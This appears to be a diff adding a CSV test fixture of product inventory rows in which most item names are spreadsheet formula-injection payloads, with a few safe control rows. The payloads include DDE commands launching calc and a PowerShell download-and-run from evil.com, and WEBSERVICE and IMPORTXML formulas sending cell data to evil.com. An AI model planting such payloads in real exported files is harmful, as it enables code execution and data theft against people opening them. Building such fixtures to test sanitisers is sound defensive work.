@@ -1,0 +1,15 @@
+Item Name,HSN Code,Price,GST Rate %,Quantity Unit,Stock Qty,Description
+=1+1+cmd|'/c calc'!A1,12345,100,18,Nos,10,Command execution attempt via DDE
+=HYPERLINK("http://evil.com";"Click for discount!"),67890,200,12,Pcs,20,Phishing attempt via HYPERLINK formula
+@SUM(1+1),11111,300,5,Kg,30,At-sign formula injection
++1+WEBSERVICE("http://evil.com/log?data="&A1),22222,400,18,Nos,40,Plus sign with WEBSERVICE exfiltration
+-1+1,33333,500,28,Pcs,50,Minus sign formula injection
+|calc,44444,600,18,Nos,60,Pipe character injection attempt
+	Malicious Tab,55555,700,12,Pcs,70,Tab character at start (hidden)
+Normal Safe Product,66666,800,18,Nos,80,This is a completely safe product
+Product with email user+tag@example.com,77777,900,5,Pcs,90,Safe: special char not at start
+Product with phone 123-456-7890,88888,1000,18,Nos,100,Safe: hyphen not at start
+=IMPORTXML(CONCAT("http://evil.com/?v=";A2);"//root"),99999,1100,12,Pcs,110,Data exfiltration via IMPORTXML
+=cmd|'/c powershell IEX(wget http://evil.com/payload)'!A1,10101,1200,18,Nos,120,PowerShell payload execution
+@SUM(INDIRECT("RC[-1]";FALSE)),20202,1300,5,Kg,130,Indirect reference injection
+=1+1&char(10)&"=1+1",30303,1400,28,Pcs,140,Multi-line formula injection
